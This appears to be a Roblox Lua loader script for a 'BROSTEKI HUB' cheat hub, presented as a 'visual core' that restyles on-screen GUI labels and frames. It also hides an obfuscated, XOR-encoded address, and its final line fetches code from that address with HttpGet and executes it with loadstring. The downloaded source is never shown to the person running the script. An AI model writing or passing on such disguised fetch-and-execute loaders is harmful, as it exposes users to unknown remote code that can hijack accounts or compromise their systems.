
--[[ STAGE 2: VISUAL CORE ]]
local smrOc1P8ktYHE7C0="\009\009\013\013\014\203\226\230\031\052\042\247\066\060\061\069\068\083\076\074\100\083\102\102\107\105\124\119\117\063\134\134\140\078\147\150\155\164\164\176\172\180\179\170\197\126\199\187\200\210\206\206\224\225\229\166\236\244\240\247\186\030\025\022\041\252\009\032\015\018\033\038\037\062\074\060\061\065\065\076\078\074\098\106\090\088\087\106\116\126\120\123\041\044\141\145\064\068\083\153\148\164"local R7cWpfFkAmGla2iOj=59 local WyGhKRRpcieJ6Y_wSon=149 local CNLr57yzVCB6ht1nn9QFWY=0 local rR0Y6slz1yUPEFd30ez0=4 local V7PVIVJEUW5SQUnVjxOWH=29 local wLMBGMk5Qo0mkKE=false local RhXi2GVENvwxHA=bit32 and bit32.bxor if not RhXi2GVENvwxHA then RhXi2GVENvwxHA=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local O8xAjNFXQjvofLzzEA5={}for Hx980fKYFgvHC=1,#smrOc1P8ktYHE7C0 do local UOmRUxY7rXMV6C=string.byte(smrOc1P8ktYHE7C0,Hx980fKYFgvHC)local Lr7B_rkQTRnjIrnCLDc=(WyGhKRRpcieJ6Y_wSon+(Hx980fKYFgvHC*rR0Y6slz1yUPEFd30ez0)+V7PVIVJEUW5SQUnVjxOWH)%256 if CNLr57yzVCB6ht1nn9QFWY==0 then UOmRUxY7rXMV6C=(UOmRUxY7rXMV6C-Lr7B_rkQTRnjIrnCLDc)%256 O8xAjNFXQjvofLzzEA5[Hx980fKYFgvHC]=string.char(RhXi2GVENvwxHA(UOmRUxY7rXMV6C,R7cWpfFkAmGla2iOj))else UOmRUxY7rXMV6C=RhXi2GVENvwxHA(UOmRUxY7rXMV6C,R7cWpfFkAmGla2iOj)O8xAjNFXQjvofLzzEA5[Hx980fKYFgvHC]=string.char((UOmRUxY7rXMV6C-Lr7B_rkQTRnjIrnCLDc)%256)end end local IgKR1UfqnKFNFDGbRXgAo=table.concat(O8xAjNFXQjvofLzzEA5)if wLMBGMk5Qo0mkKE then IgKR1UfqnKFNFDGbRXgAo=string.reverse(IgKR1UfqnKFNFDGbRXgAo)end local dALZ2lfrfjcd=IgKR1UfqnKFNFDGbRXgAo
local HubName = "BROSTEKI HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(dALZ2lfrfjcd))()
